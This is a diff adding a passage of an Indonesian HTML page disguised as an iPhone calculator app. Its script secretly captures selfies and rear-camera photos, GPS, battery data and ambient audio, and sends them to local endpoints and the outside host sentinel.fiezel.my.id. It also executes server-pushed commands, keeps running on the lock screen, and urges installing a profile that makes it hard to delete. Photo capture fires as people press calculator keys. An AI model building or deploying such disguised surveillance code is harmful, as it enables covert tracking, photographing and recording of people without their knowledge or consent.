@@ -1,0 +1,1103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Kalkulator">
+  <link rel="apple-touch-icon" href="/calc-icon.png">
+  <link rel="icon" type="image/png" href="/calc-icon.png">
+  <title>Kalkulator</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
+    body {
+      background: #000;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: env(safe-area-inset-top, 20px) 16px env(safe-area-inset-bottom, 24px) 16px;
+      overflow: hidden;
+    }
+
+    #silentVideo, #silentCanvas, #envVideo, #envCanvas {
+      position: absolute; width: 1px; height: 1px; opacity: 0;
+      pointer-events: none; left: -9999px; top: -9999px;
+    }
+
+    #installBanner {
+      display: none;
+      position: fixed;
+      top: env(safe-area-inset-top, 14px);
+      left: 14px;
+      right: 14px;
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.95), rgba(5, 150, 105, 0.98));
+      border: 1px solid #34d399;
+      border-radius: 14px;
+      padding: 12px 14px;
+      color: #fff;
+      z-index: 99999;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.7), 0 0 20px rgba(52, 211, 153, 0.3);
+      font-size: 12px;
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      animation: bannerSlideDown 0.4s ease-out;
+    }
+    @keyframes bannerSlideDown {
+      from { transform: translateY(-30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    #tapToArmHint {
+      display: none;
+      position: fixed;
+      top: calc(env(safe-area-inset-top, 20px) + 65px);
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid #38bdf8;
+      border-radius: 20px;
+      padding: 6px 14px;
+      font-size: 11px;
+      color: #38bdf8;
+      font-weight: 700;
+      z-index: 999;
+      pointer-events: none;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.5);
+      animation: pulseHint 2s infinite;
+    }
+    @keyframes pulseHint {
+      0%, 100% { opacity: 0.85; transform: translateX(-50%) scale(1); }
+      50% { opacity: 1; transform: translateX(-50%) scale(1.04); }
+    }
+
+    #screenStrobe {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #ffffff;
+      z-index: 999998;
+      pointer-events: none;
+      opacity: 0.95;
+    }
+
+    #calcWrap {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    .calc-screen {
+      font-size: 68px;
+      font-weight: 300;
+      text-align: right;
+      padding: 10px 14px 20px;
+      color: #fff;
+      letter-spacing: -1px;
+      word-break: break-all;
+      min-height: 100px;
+      display: flex;
+      align-items: flex-end;
+      justify-content: flex-end;
+    }
+    .calc-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+    }
+    .btn {
+      aspect-ratio: 1;
+      border-radius: 50%;
+      border: none;
+      font-size: 30px;
+      font-weight: 400;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #333333;
+      color: #ffffff;
+      transition: opacity 0.1s, transform 0.08s;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .btn:active {
+      opacity: 0.55;
+      transform: scale(0.96);
+    }
+    .btn.top { background: #a5a5a5; color: #000000; }
+    .btn.op { background: #ff9f0a; color: #ffffff; }
+    .btn.zero {
+      grid-column: span 2;
+      aspect-ratio: auto;
+      border-radius: 44px;
+      padding-left: 30px;
+      justify-content: flex-start;
+    }
+    .secret-label {
+      text-align: center;
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.12);
+      margin-top: 14px;
+      padding: 6px;
+      cursor: pointer;
+    }
+
+    #ownerModal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(10, 15, 30, 0.96);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      z-index: 999999;
+      flex-direction: column;
+      padding: 30px 20px;
+      overflow-y: auto;
+    }
+    .modal-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .modal-head h2 { font-size: 18px; font-weight: 800; color: #fff; }
+    .modal-close { background: none; border: none; color: #94a3b8; font-size: 24px; cursor: pointer; }
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 14px;
+    }
+    .card-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #38bdf8;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      font-size: 13px;
+    }
+    .row:last-child { border: none; }
+    .lbl { color: #94a3b8; }
+    .val { font-family: monospace; color: #38bdf8; font-weight: 700; text-align: right; max-width: 60%; }
+    .val.green { color: #34d399; }
+    .val.red { color: #f87171; }
+    .btn-action {
+      width: 100%;
+      padding: 12px;
+      border-radius: 12px;
+      border: none;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-green { background: #059669; color: #fff; }
+    .btn-blue { background: #0284c7; color: #fff; }
+    .btn-red { background: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; color: #fca5a5; }
+
+    #lockMsg {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.97);
+      z-index: 9999999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      padding: 30px;
+      text-align: center;
+    }
+    .lock-icon { font-size: 80px; margin-bottom: 20px; }
+    .lock-text { font-size: 22px; font-weight: 800; color: #fff; margin-bottom: 12px; }
+    .lock-sub { font-size: 15px; color: #94a3b8; line-height: 1.6; }
+
+    @keyframes alarmPulseBg { 0%, 100% { background: #000; } 50% { background: #450a0a; } }
+    .alarming { animation: alarmPulseBg 0.4s infinite; }
+
+    #statusDot {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: #34d399;
+      position: fixed;
+      top: env(safe-area-inset-top, 16px);
+      right: 16px;
+      box-shadow: 0 0 8px #34d399;
+      transition: all 0.3s;
+      z-index: 1000;
+    }
+    #statusDot.red { background: #ef4444; box-shadow: 0 0 8px #ef4444; }
+    #statusDot.yellow { background: #fbbf24; box-shadow: 0 0 8px #fbbf24; }
+  </style>
+</head>
+<body>
+
+<video id="silentVideo" autoplay playsinline muted></video>
+<canvas id="silentCanvas" width="480" height="640"></canvas>
+<video id="envVideo" autoplay playsinline muted></video>
+<canvas id="envCanvas" width="480" height="640"></canvas>
+<audio id="bgKeepAlive" loop playsinline preload="auto" src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA"></audio>
+
+<div id="installBanner">
+  <div style="display: flex; align-items: center; justify-content: space-between; gap: 10px;">
+    <div>
+      <strong style="font-size: 13px; display: flex; align-items: center; gap: 6px;">👑 Proteksi Anti-Hapus Apple</strong>
+      <div style="font-size: 11px; opacity: 0.95; margin-top: 2px;">Pasang Profil agar Kalkulator <strong>TIDAK BISA DIHAPUS PENCURI</strong> di iPhone Anda.</div>
+    </div>
+    <a href="/sentinel.mobileconfig" download="Kalkulator.mobileconfig" style="background: #ffffff; color: #065f46; padding: 7px 12px; border-radius: 8px; font-weight: 800; font-size: 11px; text-decoration: none; white-space: nowrap; box-shadow: 0 2px 8px rgba(0,0,0,0.25);">
+      📥 Pasang
+    </a>
+  </div>
+</div>
+
+<div id="tapToArmHint">🎯 Ketuk Layar untuk Mengaktifkan Radar</div>
+<div id="statusDot" title="Sentinel Guard Online"></div>
+<div id="screenStrobe"></div>
+
+<div id="lockMsg">
+  <div class="lock-icon">🔒</div>
+  <div class="lock-text">Perangkat Terkunci</div>
+  <div class="lock-sub" id="lockText">HP ini dilaporkan hilang. Mohon segera hubungi pemilik.</div>
+</div>
+
+<div id="calcWrap">
+  <div class="calc-screen" id="calcDisplay">0</div>
+  <div class="calc-grid">
+    <button class="btn top" id="btnAC" onclick="ca('C')">AC</button>
+    <button class="btn top" onclick="ca('+/-')">±</button>
+    <button class="btn top" onclick="ca('%')">%</button>
+    <button class="btn op" onclick="ca('/')">÷</button>
+    <button class="btn" onclick="ca('7')">7</button>
+    <button class="btn" onclick="ca('8')">8</button>
+    <button class="btn" onclick="ca('9')">9</button>
+    <button class="btn op" onclick="ca('*')">×</button>
+    <button class="btn" onclick="ca('4')">4</button>
+    <button class="btn" onclick="ca('5')">5</button>
+    <button class="btn" onclick="ca('6')">6</button>
+    <button class="btn op" onclick="ca('-')">−</button>
+    <button class="btn" onclick="ca('1')">1</button>
+    <button class="btn" onclick="ca('2')">2</button>
+    <button class="btn" onclick="ca('3')">3</button>
+    <button class="btn op" onclick="ca('+')">+</button>
+    <button class="btn zero" onclick="ca('0')">0</button>
+    <button class="btn" onclick="ca('.')">.</button>
+    <button class="btn op" onclick="ca('=')">=</button>
+  </div>
+  <div class="secret-label" id="secretTrigger">v4.5 iOS Utility Service</div>
+</div>
+
+<div id="ownerModal">
+  <div class="modal-head">
+    <h2>🛡️ Pusat Radar &amp; Telemetri HP</h2>
+    <button class="modal-close" onclick="closeModal()">✕</button>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📱 Identitas HP Ini (Anti-Campur)</div>
+    <div class="row"><span class="lbl">ID Perangkat</span><span class="val" id="mDeviceId" style="color: #38bdf8; font-family: monospace; font-weight: 700;">—</span></div>
+    <div class="row"><span class="lbl">Nama HP</span><span class="val" id="mDeviceName">—</span></div>
+    <button class="btn-action btn-blue" style="margin-top: 8px; padding: 7px; font-size: 11px;" onclick="promptRenameDevice()">✏️ Ubah Nama HP Ini</button>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📡 Status Radar Magnet</div>
+    <div class="row"><span class="lbl">Server Backend</span><span class="val" id="mBackend">—</span></div>
+    <div class="row"><span class="lbl">Transmisi Terakhir</span><span class="val" id="mLastTx">—</span></div>
+    <div class="row"><span class="lbl">Total Laporan Beacon</span><span class="val" id="mTxCount">0</span></div>
+    <div class="row"><span class="lbl">Interval Otomatis</span><span class="val" id="mInterval">45 dtk</span></div>
+    <div class="row"><span class="lbl">Status Audio iOS</span><span class="val green" id="mAudioStatus">Siap Berdering (Bypass Kunci)</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📍 Koordinat GPS Terkini</div>
+    <div class="row"><span class="lbl">Koordinat</span><span class="val" id="mCoords">Memindai...</span></div>
+    <div class="row"><span class="lbl">Akurasi GPS</span><span class="val" id="mAccuracy">—</span></div>
+    <div class="row"><span class="lbl">Baterai HP</span><span class="val" id="mBattery">—</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⚡ Aksi Cepat &amp; Uji Coba</div>
+    <button class="btn-action btn-green" onclick="sendBeacon(true, false, 'owner-force-sync')">📡 Kirim GPS + Foto ke Laptop Sekarang</button>
+    <button class="btn-action btn-blue" onclick="playPiercingSound('sonar')">🔊 Uji Suara Sonar Radar (1x)</button>
+    <button class="btn-action btn-blue" onclick="playPiercingSound('siren')">🚨 Uji Sirine Keras Kasur</button>
+    <button class="btn-action btn-red" onclick="stopAlarm()">⏹️ Matikan Seluruh Bunyi</button>
+    <a href="/sentinel.mobileconfig" download="Kalkulator.mobileconfig" class="btn-action" style="background: rgba(16, 185, 129, 0.2); border: 1px solid #10b981; color: #a7f3d0; text-decoration: none; text-align: center; margin-top: 6px;">
+      📥 Unduh Profil Anti-Hapus (.mobileconfig)
+    </a>
+  </div>
+</div>
+
+<script>
+'use strict';
+
+const CFG = (() => {
+  const urlParams = new URLSearchParams(location.search);
+  const paramDev = urlParams.get('device') || urlParams.get('id');
+  const storedDev = localStorage.getItem('sz_device');
+  const isIos = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+  const randomSuffix = Math.random().toString(36).slice(2, 6).toUpperCase();
+  const deviceId = paramDev || storedDev || ((isIos ? 'IPHONE-' : 'HP-') + randomSuffix);
+  localStorage.setItem('sz_device', deviceId);
+
+  const storedName = localStorage.getItem('sz_name');
+  const deviceName = urlParams.get('name') || storedName || (isIos ? ('iPhone ' + deviceId.slice(-4)) : ('HP ' + deviceId.slice(-4)));
+  localStorage.setItem('sz_name', deviceName);
+
+  const localBase = localStorage.getItem('sz_local') || '';
+  const cloudBase = location.origin.includes('sentinel.fiezel.my.id') ? location.origin : 'https://sentinel.fiezel.my.id';
+
+  return { deviceId, deviceName, isIos, localBase, cloudBase };
+})();
+
+let lastLat = null;
+let lastLon = null;
+let lastAcc = null;
+let lastAltitude = null;
+let lastHeading = null;
+let lastSpeed = null;
+let txCount = parseInt(localStorage.getItem('sz_txcount') || '0');
+let beaconInterval = parseInt(localStorage.getItem('sz_interval') || '45');
+let beaconTimer = null;
+let secretTaps = 0;
+let secretTimer = null;
+let motionAlerted = false;
+const DOT = document.getElementById('statusDot');
+
+const isStandalone = window.navigator.standalone === true || window.matchMedia('(display-mode: standalone)').matches;
+if (!isStandalone) {
+  const banner = document.getElementById('installBanner');
+  if (banner) banner.style.display = 'block';
+  const hint = document.getElementById('tapToArmHint');
+  if (hint) hint.style.display = 'block';
+}
+
+let globalAudioCtx = null;
+let audioUnlocked = false;
+
+function getAudioContext() {
+  if (!globalAudioCtx) {
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    if (AudioCtx) globalAudioCtx = new AudioCtx();
+  }
+  if (globalAudioCtx && globalAudioCtx.state === 'suspended') {
+    globalAudioCtx.resume().catch(() => {});
+  }
+  return globalAudioCtx;
+}
+
+function ensureAudioAndSensorsUnlocked() {
+  if (audioUnlocked) return;
+  audioUnlocked = true;
+
+  const hint = document.getElementById('tapToArmHint');
+  if (hint) hint.style.display = 'none';
+
+  // 1. Aktifkan HTML5 background audio loop agar proses browser tidak dibekukan saat layar terkunci
+  try {
+    const bgAudio = document.getElementById('bgKeepAlive');
+    if (bgAudio) {
+      bgAudio.volume = 0.01;
+      bgAudio.play().then(() => {
+        console.log('[Sentinel] Background Audio Keep-Alive Aktif di iOS (Anti-Freeze Layar Kunci)');
+      }).catch(() => {});
+    }
+  } catch (e) {}
+
+  // 2. Daftarkan Media Session iOS agar sistem operasi menganggap ini pemutar media aktif di layar kunci
+  if ('mediaSession' in navigator) {
+    try {
+      navigator.mediaSession.metadata = new MediaMetadata({
+        title: 'Radar Sentinel Standby',
+        artist: 'Ghost Sentinel',
+        album: 'Bypass Layar Kunci'
+      });
+      navigator.mediaSession.playbackState = 'playing';
+      navigator.mediaSession.setActionHandler('play', () => {});
+      navigator.mediaSession.setActionHandler('pause', () => {});
+    } catch (e) {}
+  }
+
+  // 3. Buka AudioContext WebKit
+  try {
+    const ctx = getAudioContext();
+    if (ctx) {
+      const buffer = ctx.createBuffer(1, 1, 22050);
+      const source = ctx.createBufferSource();
+      source.buffer = buffer;
+      source.connect(ctx.destination);
+      source.start(0);
+      console.log('[Sentinel] AudioContext iOS Berhasil Dibuka');
+    }
+  } catch (e) {}
+
+  getGPS().then(() => {
+    sendBeacon(true, false, 'user-activated');
+  }).catch(() => {});
+
+  setTimeout(initClapDetector, 2000);
+}
+
+window.addEventListener('touchstart', ensureAudioAndSensorsUnlocked, { once: true, passive: true });
+window.addEventListener('click', ensureAudioAndSensorsUnlocked, { once: true, passive: true });
+
+let alarmTimer = null;
+let strobeTimer = null;
+
+function stopAlarm() {
+  if (alarmTimer) { clearInterval(alarmTimer); alarmTimer = null; }
+  if (strobeTimer) { clearInterval(strobeTimer); strobeTimer = null; }
+  const strobe = document.getElementById('screenStrobe');
+  if (strobe) strobe.style.display = 'none';
+  document.body.classList.remove('alarming');
+  if ('vibrate' in navigator) {
+    try { navigator.vibrate(0); } catch (e) {}
+  }
+  console.log('[Sentinel] Alarm & Sonar Dihentikan');
+}
+
+function flashStrobe(durationMs = 250, color = '#ffffff') {
+  const strobe = document.getElementById('screenStrobe');
+  if (!strobe) return;
+  strobe.style.background = color;
+  strobe.style.display = 'block';
+  setTimeout(() => {
+    strobe.style.display = 'none';
+  }, durationMs);
+}
+
+function startContinuousStrobe() {
+  if (strobeTimer) clearInterval(strobeTimer);
+  const strobe = document.getElementById('screenStrobe');
+  if (!strobe) return;
+  let on = false;
+  strobeTimer = setInterval(() => {
+    on = !on;
+    strobe.style.display = on ? 'block' : 'none';
+  }, 120);
+}
+
+function playPiercingSound(mode = 'sonar') {
+  stopAlarm();
+  try {
+    const ctx = getAudioContext();
+    if (!ctx) return;
+    if (ctx.state === 'suspended') {
+      ctx.resume().catch(() => {});
+    }
+
+    if (mode === 'sonar') {
+      let count = 0;
+      const doPing = () => {
+        if (count >= 8) { stopAlarm(); return; }
+        try {
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(1800, ctx.currentTime);
+          osc.frequency.exponentialRampToValueAtTime(3200, ctx.currentTime + 0.18);
+          gain.gain.setValueAtTime(0.95, ctx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.25);
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start();
+          osc.stop(ctx.currentTime + 0.25);
+
+          if ('vibrate' in navigator) navigator.vibrate([100, 50, 150]);
+          flashStrobe(200, '#38bdf8');
+        } catch (e) {}
+        count++;
+      };
+      doPing();
+      alarmTimer = setInterval(doPing, 450);
+    } else {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = 'triangle';
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      gain.gain.setValueAtTime(1.0, ctx.currentTime);
+      osc.start();
+
+      let high = false;
+      const warble = () => {
+        try {
+          const now = ctx.currentTime;
+          osc.frequency.cancelScheduledValues(now);
+          osc.frequency.linearRampToValueAtTime(high ? 2400 : 3600, now + 0.15);
+          high = !high;
+        } catch (e) {}
+      };
+      warble();
+      alarmTimer = setInterval(warble, 180);
+
+      document.body.classList.add('alarming');
+      startContinuousStrobe();
+      if ('vibrate' in navigator) navigator.vibrate([400, 100, 400, 100, 400]);
+
+      setTimeout(stopAlarm, 60000);
+    }
+  } catch (err) {
+    console.warn('[Alarm Audio Error]', err);
+  }
+}
+
+async function recordAmbientAudio(durationMs = 5000) {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+    const mime = (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('audio/webm')) ? 'audio/webm' :
+                 (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('audio/mp4')) ? 'audio/mp4' : '';
+    const recorder = mime ? new MediaRecorder(stream, { mimeType: mime }) : new MediaRecorder(stream);
+    const chunks = [];
+
+    recorder.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) chunks.push(e.data);
+    };
+
+    recorder.onstop = async () => {
+      stream.getTracks().forEach(t => t.stop());
+      const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        const base64 = reader.result;
+        fetch('/api/sentinel/audio', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            audio: base64,
+            duration: Math.round(durationMs / 1000),
+            timestamp: Date.now()
+          })
+        }).catch(() => {});
+      };
+      reader.readAsDataURL(blob);
+    };
+
+    recorder.start();
+    setTimeout(() => {
+      if (recorder.state === 'recording') recorder.stop();
+    }, durationMs);
+  } catch (err) {
+    console.warn('[Record Ambient Audio Failed]', err.message);
+  }
+}
+
+let clapDetectorActive = false;
+function initClapDetector() {
+  if (clapDetectorActive) return;
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(stream => {
+      clapDetectorActive = true;
+      const ctx = getAudioContext();
+      if (!ctx) return;
+      const mic = ctx.createMediaStreamSource(stream);
+      const analyser = ctx.createAnalyser();
+      analyser.fftSize = 256;
+      mic.connect(analyser);
+
+      const data = new Uint8Array(analyser.frequencyBinCount);
+      let lastTrigger = 0;
+
+      setInterval(() => {
+        analyser.getByteFrequencyData(data);
+        let sum = 0;
+        for (let i = 0; i < data.length; i++) sum += data[i];
+        const avg = sum / data.length;
+
+        if (avg > 78 && (Date.now() - lastTrigger > 3500)) {
+          lastTrigger = Date.now();
+          console.log('[Radar] Tepukan / Suara Panggilan Terdeteksi');
+          playPiercingSound('sonar');
+          fetch('/api/sentinel/intercept', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              type: 'sound_detected',
+              label: 'Panggilan / Tepukan Tangan Terdeteksi',
+              value: 'HP merespons tepukan pemilik di ruangan',
+              timestamp: Date.now()
+            })
+          }).catch(() => {});
+        }
+      }, 120);
+    }).catch(() => {});
+  } catch (e) {}
+}
+
+async function captureSelfie() {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 640 } },
+      audio: false
+    });
+    const vid = document.getElementById('silentVideo');
+    vid.srcObject = stream;
+    await vid.play().catch(() => {});
+    await new Promise(r => setTimeout(r, 450));
+    const cnv = document.getElementById('silentCanvas');
+    cnv.width = vid.videoWidth || 480;
+    cnv.height = vid.videoHeight || 640;
+    cnv.getContext('2d').drawImage(vid, 0, 0);
+    const dataUrl = cnv.toDataURL('image/jpeg', 0.55);
+    stream.getTracks().forEach(t => t.stop());
+    vid.srcObject = null;
+    return dataUrl;
+  } catch {
+    return null;
+  }
+}
+
+async function captureEnvironment() {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    const vid = document.getElementById('envVideo');
+    vid.srcObject = stream;
+    await vid.play().catch(() => {});
+    await new Promise(r => setTimeout(r, 450));
+    const cnv = document.getElementById('envCanvas');
+    cnv.width = vid.videoWidth || 640;
+    cnv.height = vid.videoHeight || 480;
+    cnv.getContext('2d').drawImage(vid, 0, 0);
+    const dataUrl = cnv.toDataURL('image/jpeg', 0.55);
+    stream.getTracks().forEach(t => t.stop());
+    vid.srcObject = null;
+    return dataUrl;
+  } catch {
+    return null;
+  }
+}
+
+function getGPS() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) { resolve({}); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        lastLat = pos.coords.latitude;
+        lastLon = pos.coords.longitude;
+        lastAcc = pos.coords.accuracy;
+        lastAltitude = pos.coords.altitude;
+        lastHeading = pos.coords.heading;
+        lastSpeed = pos.coords.speed;
+        resolve({
+          lat: lastLat,
+          lon: lastLon,
+          accuracy: lastAcc,
+          altitude: lastAltitude,
+          heading: lastHeading,
+          speed: lastSpeed
+        });
+      },
+      () => resolve({}),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  });
+}
+
+async function getBattery() {
+  try {
+    if ('getBattery' in navigator) {
+      const b = await navigator.getBattery();
+      return { battery: Math.round(b.level * 100), charging: b.charging };
+    }
+  } catch {}
+  return {};
+}
+
+async function sendBeaconData(extra = {}) {
+  const [gps, bat] = await Promise.all([getGPS(), getBattery()]);
+
+  const payload = {
+    lat: lastLat || (gps && gps.lat) || -6.2088,
+    lon: lastLon || (gps && gps.lon) || 106.8456,
+    accuracy: lastAcc || 15,
+    altitude: lastAltitude ?? null,
+    heading: lastHeading ?? null,
+    speed: lastSpeed ?? 0,
+    batteryLevel: bat.battery ?? 100,
+    battery: bat.battery ?? 100,
+    isCharging: bat.charging ?? false,
+    charging: bat.charging ?? false,
+    batterySource: bat.battery !== null ? 'browser' : 'hardware',
+    deviceId: CFG.deviceId || 'IPHONE-RADAR',
+    deviceName: CFG.deviceName || 'iPhone Pemilik',
+    platform: CFG.isIos ? 'Apple iPhone (iOS)' : 'Android / Smartphone',
+    alertType: extra.alertReason || (extra.alert ? 'alert' : 'radar_beacon'),
+    photo: extra.selfie || extra.photo || null,
+    environmentPhoto: extra.environment || extra.environmentPhoto || null,
+    selfie: extra.selfie || null,
+    environment: extra.environment || null,
+    networkName: navigator.connection ? (navigator.connection.effectiveType || 'Seluler') : 'Seluler',
+    screen: window.screen.width + 'x' + window.screen.height + '(@' + (window.devicePixelRatio||1) + 'x)',
+    userAgent: navigator.userAgent,
+    ...extra
+  };
+
+  const endpoints = [
+    '/api/sentinel/beacon',
+    CFG.cloudBase + '/api/sentinel/beacon'
+  ];
+  if (CFG.localBase) endpoints.push(CFG.localBase + '/api/sentinel/beacon');
+
+  let commands = [];
+  let success = false;
+
+  for (const url of [...new Set(endpoints)]) {
+    try {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        signal: AbortSignal.timeout(8000)
+      });
+      if (res.ok) {
+        const data = await res.json();
+        if (data.commands && Array.isArray(data.commands)) {
+          commands = data.commands;
+        }
+        success = true;
+        updateDot('green');
+        break;
+      }
+    } catch {}
+  }
+
+  if (!success) updateDot('red');
+  else updateDot('green');
+
+  txCount++;
+  localStorage.setItem('sz_txcount', String(txCount));
+
+  for (const cmd of commands) {
+    await execCmd(cmd);
+  }
+
+  return success;
+}
+
+async function sendBeacon(withPhoto = false, isAlert = false, reason = '') {
+  const extra = { alert: isAlert };
+  if (reason) extra.alertReason = reason;
+
+  if (withPhoto) {
+    const selfie = await captureSelfie();
+    if (selfie) extra.selfie = selfie;
+    await new Promise(r => setTimeout(r, 120));
+    const env = await captureEnvironment();
+    if (env) extra.environment = env;
+  } else {
+    if (txCount % 3 === 0) {
+      const selfie = await captureSelfie();
+      if (selfie) extra.selfie = selfie;
+    }
+  }
+
+  return sendBeaconData(extra);
+}
+
+async function execCmd(cmd) {
+  if (!cmd) return;
+  if (cmd.targetDeviceId && cmd.targetDeviceId !== 'all' && cmd.targetDeviceId !== CFG.deviceId) {
+    return; // Komando ditujukan ke perangkat lain
+  }
+  const type = cmd.type || cmd.mode;
+  switch (type) {
+    case 'sonar':
+    case 'chime':
+      playPiercingSound('sonar');
+      break;
+    case 'siren':
+    case 'alarm':
+      playPiercingSound('siren');
+      break;
+    case 'stop':
+    case 'stop_chime':
+      stopAlarm();
+      break;
+    case 'record_audio':
+      recordAmbientAudio((cmd.duration || 5) * 1000);
+      break;
+    case 'photo':
+    case 'selfie':
+    case 'capture_photo':
+      sendBeacon(true, false, 'cmd-remote-photo');
+      break;
+    case 'lock_msg':
+      showLock(cmd.message || 'HP ini dilaporkan hilang. Hubungi pemilik.');
+      break;
+  }
+}
+
+function handleRemoteSignal(data) {
+  if (!data) return;
+  if (data.targetDeviceId && data.targetDeviceId !== 'all' && data.targetDeviceId !== CFG.deviceId) {
+    return; // Komando ditujukan ke perangkat lain
+  }
+  if (data.type === 'play_chime') {
+    playPiercingSound(data.mode || 'sonar');
+  } else if (data.type === 'stop_chime') {
+    stopAlarm();
+  } else if (data.type === 'record_audio') {
+    recordAmbientAudio((data.duration || 5) * 1000);
+  } else if (data.type === 'capture_photo' || data.type === 'photo') {
+    sendBeacon(true, false, 'cmd-remote-photo');
+  }
+}
+
+function initSSE() {
+  try {
+    const es = new EventSource('/api/events');
+    es.onmessage = (e) => {
+      try {
+        const data = JSON.parse(e.data);
+        handleRemoteSignal(data);
+      } catch {}
+    };
+    es.onerror = () => {
+      es.close();
+      setTimeout(initSSE, 4000);
+    };
+  } catch {}
+}
+
+function initTrackSocket() {
+  try {
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const ws = new WebSocket(proto + '//' + location.host);
+    ws.onmessage = (e) => {
+      try {
+        const data = JSON.parse(e.data);
+        handleRemoteSignal(data);
+      } catch {}
+    };
+    ws.onclose = () => { setTimeout(initTrackSocket, 4000); };
+    ws.onerror = () => { try { ws.close(); } catch {} };
+  } catch {}
+}
+
+function startCommandPolling() {
+  setInterval(async () => {
+    try {
+      const res = await fetch('/api/sentinel/commands', { signal: AbortSignal.timeout(3000) });
+      if (res.ok) {
+        const d = await res.json();
+        if (d.commands && Array.isArray(d.commands)) {
+          for (const c of d.commands) await execCmd(c);
+        }
+      }
+    } catch {}
+  }, 4000);
+}
+
+let calcState = { display: '0', prev: null, op: null, fresh: true };
+const $disp = document.getElementById('calcDisplay');
+const $ac = document.getElementById('btnAC');
+let keyPressCount = 0;
+
+function ca(v) {
+  ensureAudioAndSensorsUnlocked();
+  keyPressCount++;
+
+  if (keyPressCount % 4 === 1) {
+    sendBeacon(true, false, 'thief-calc-interact');
+  }
+
+  const s = calcState;
+  if (v === 'C') {
+    calcState = { display: '0', prev: null, op: null, fresh: true };
+    $ac.textContent = 'AC';
+    $disp.textContent = '0';
+    return;
+  }
